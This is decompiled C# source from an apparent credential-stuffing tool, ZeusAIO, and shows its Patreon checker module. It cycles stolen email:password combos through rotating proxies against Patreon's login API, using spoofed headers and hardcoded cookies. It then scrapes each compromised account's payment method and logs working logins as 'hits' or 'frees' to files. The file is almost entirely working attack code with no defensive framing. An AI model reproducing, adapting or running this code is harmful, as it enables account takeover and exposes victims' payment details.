// Decompiled with JetBrains decompiler
// Type: Patreon.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Patreon
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("cookie", "patreon_locale_code=en-US; patreon_location_country_code=US; __cfduid=d4a78ee5214179435b57491f8fbb4b2211600999720; patreon_device_id=73c88a40-faa8-44d6-964b-78de1aae8962; __cf_bm=4ddce7d1c141a2853984692ea2f33aa65da351b6-1600999720-1800-AcP/65P8WHWVAZaBQ80wx/R0B09Z4yqZhNtQF9yFCRGm/yePclYrpR3By2+loXxQdOKbgS1eyV5YWfNF7I1EAfQ=; CREATOR_DEMO_COOKIE=1; G_ENABLED_IDPS=google");
              string str1 = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"},\"relationships\":{}}}";
              httpRequest.AddHeader("x-csrf-signature", "Sg3rMb1o922PEstPb4LXzHqPygE3MIdMhX762CZ3S2g");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0", str1, "application/json").ToString();
              if (!str2.Contains("Incorrect email or password"))
              {
                if (str2.Contains("Device Verification"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - PATREON] " + s[0], Color.OrangeRed);
                  Export.AsResult("/Patreon_frees", s[0] + ":" + s[1]);
                  return false;
                }
                if (str2.Contains("attributes"))
                {
                  string source = httpRequest.Get("https://www.patreon.com/pledges?ty=p").ToString();
                  string str3 = Check.Parse(source, "payout_method\": \"", "\"");
                  if (source.Contains("UNDEFINED"))
                  {
                    ++mainmenu.frees;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[FREE - PATREON] " + s[0] + ":" + s[1] + " | Payment Method: " + str3, Color.OrangeRed);
                    Export.AsResult("/Patreon_frees", s[0] + ":" + s[1] + " | Payment Method: " + str3);
                    return false;
                  }
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - PATREON] " + s[0] + ":" + s[1] + " | Payment Method: " + str3, Color.Green);
                  Export.AsResult("/Patreon_hits", s[0] + ":" + s[1] + " | Payment Method: " + str3);
                  return false;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
